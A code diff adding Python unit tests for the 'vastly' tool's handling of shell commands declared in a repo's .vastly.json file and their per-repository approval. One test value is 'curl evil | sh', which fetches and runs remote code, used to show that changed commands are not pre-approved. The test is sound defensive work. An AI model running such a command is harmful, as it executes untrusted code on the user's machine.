@@ -446,3 +446,59 @@ class TestConfigTemplate:
             "gitAuth",
         }
         assert set(template.keys()) == expected
+
+
+class TestProjectCommands:
+    """Which shell commands a repo's .vastly.json would run, and approvals."""
+
+    def _project(self, tmp_path, content):
+        project = tmp_path / "repo"
+        project.mkdir()
+        (project / ".vastly.json").write_text(json.dumps(content), encoding="utf-8")
+        return project
+
+    def test_no_project_config(self, tmp_path):
+        from vastly.config import project_commands
+
+        assert project_commands(None) == {}
+        assert project_commands(tmp_path) == {}
+
+    def test_extracts_install_and_post_install(self, tmp_path):
+        from vastly.config import project_commands
+
+        project = self._project(
+            tmp_path,
+            {
+                "installCommand": "make",
+                "postInstall": ["a", "", "b"],
+                "workspace": "/w",
+            },
+        )
+        assert project_commands(project) == {
+            "installCommand": "make",
+            "postInstall": ["a", "b"],
+        }
+
+    def test_single_string_post_install(self, tmp_path):
+        from vastly.config import project_commands
+
+        project = self._project(tmp_path, {"postInstall": "make setup"})
+        assert project_commands(project) == {"postInstall": ["make setup"]}
+
+    def test_config_without_commands(self, tmp_path):
+        from vastly.config import project_commands
+
+        project = self._project(tmp_path, {"copyFiles": [".env"]})
+        assert project_commands(project) == {}
+
+    def test_approval_is_per_repo_and_per_command_set(self):
+        from vastly.config import approve_commands, commands_approved
+
+        cmds = {"postInstall": ["make setup"]}
+        assert not commands_approved("git@github.com:o/r.git", cmds)
+        approve_commands("git@github.com:o/r.git", cmds)
+        assert commands_approved("git@github.com:o/r.git", cmds)
+        assert not commands_approved("git@github.com:o/other.git", cmds)
+        assert not commands_approved(
+            "git@github.com:o/r.git", {"postInstall": ["make setup", "curl evil | sh"]}
+        )
